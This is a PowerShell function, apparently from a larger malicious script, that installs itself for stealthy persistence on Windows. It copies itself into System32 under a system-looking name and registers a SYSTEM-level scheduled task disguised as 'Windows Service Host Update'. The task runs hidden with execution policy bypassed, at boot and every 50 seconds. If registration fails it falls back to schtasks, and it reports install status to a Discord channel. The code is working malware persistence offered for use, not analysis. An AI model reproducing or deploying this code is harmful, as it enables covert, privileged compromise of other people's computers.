# ============================================================================
# AUTO-INSTALL & STEALTH SETUP
# ============================================================================

function Setup-Stealth-Install {
    # Check if already installed
    if (Test-Path $InstalledFlag) {
        Send-Discord "⏰ Maintenance cycle running on $env:COMPUTERNAME" "3447003"
        return
    }
    
    try {
        # Create flag FIRST so we know we're installing
        "Installed_" | Out-File -FilePath $InstalledFlag -Encoding UTF8 -Force -ErrorAction SilentlyContinue
        
        # Copy script to System32 with system-looking name
        Copy-Item -Path $PSCommandPath -Destination $ScriptInstallPath -Force -ErrorAction SilentlyContinue
        
        Send-Discord "📦 Installing stealth service on $env:COMPUTERNAME..." "16776960"
        
        # Remove old task if exists
        try {
            Unregister-ScheduledTask -TaskName "Windows Service Host Update" -Confirm:$false -ErrorAction SilentlyContinue -Force
            Start-Sleep -Milliseconds 1000
        }
        catch { }
        
        try {
            # Create principal with SYSTEM rights
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
            
            # Create action
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptInstallPath`"" -ErrorAction SilentlyContinue
            
            # Create startup trigger
            $triggerAtBoot = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
            
            # Create repeating trigger (every 50 seconds)
            $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 50) -RepetitionDuration (New-TimeSpan -Days 36500) -ErrorAction SilentlyContinue
            
            # Settings
            $settings = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -RunOnlyIfNetworkAvailable:$false `
                -MultipleInstances IgnoreNew `
                -ErrorAction SilentlyContinue
            
            # Register the task
            Register-ScheduledTask `
                -TaskName "Windows Service Host Update" `
                -Principal $principal `
                -Action $action `
                -Trigger @($triggerAtBoot, $triggerRepeat) `
                -Settings $settings `
                -Force `
                -ErrorAction Stop | Out-Null
            
            Start-Sleep -Milliseconds 500
            
            # Verify it was created
            $task = Get-ScheduledTask -TaskName "Windows Service Host Update" -ErrorAction SilentlyContinue
            if ($task) {
                Write-Log "✓ Task created successfully" "SUCCESS"
                Send-Discord "✅ Stealth service installed! Running at boot + every 50 seconds" "65280"
            } else {
                Write-Log "! Task verification failed, using CMD fallback" "WARNING"
                # Fallback: use schtasks command
                cmd /c "schtasks /create /tn `"Windows Service Host Update`" /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptInstallPath`" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f /ito" 2>&1 | Out-Null
                Send-Discord "✅ Stealth service installed (fallback method)! Running every minute" "65280"
            }
        }
        catch {
            Write-Log "! Task registration failed: $_, trying fallback" "ERROR"
            # Fallback using schtasks
            try {
                cmd /c "schtasks /create /tn `"Windows Service Host Update`" /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptInstallPath`" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f /ito" 2>&1 | Out-Null
                Send-Discord "✅ Stealth service installed (CMD fallback)! Running every minute" "65280"
            }
            catch {
                Send-Discord "❌ All installation methods failed: $_" "16711680"
            }
        }
    }
    catch {
        Write-Log "! Setup error: $_" "ERROR"
        Send-Discord "⚠️ Installation error: $_" "16776960"
    }
}

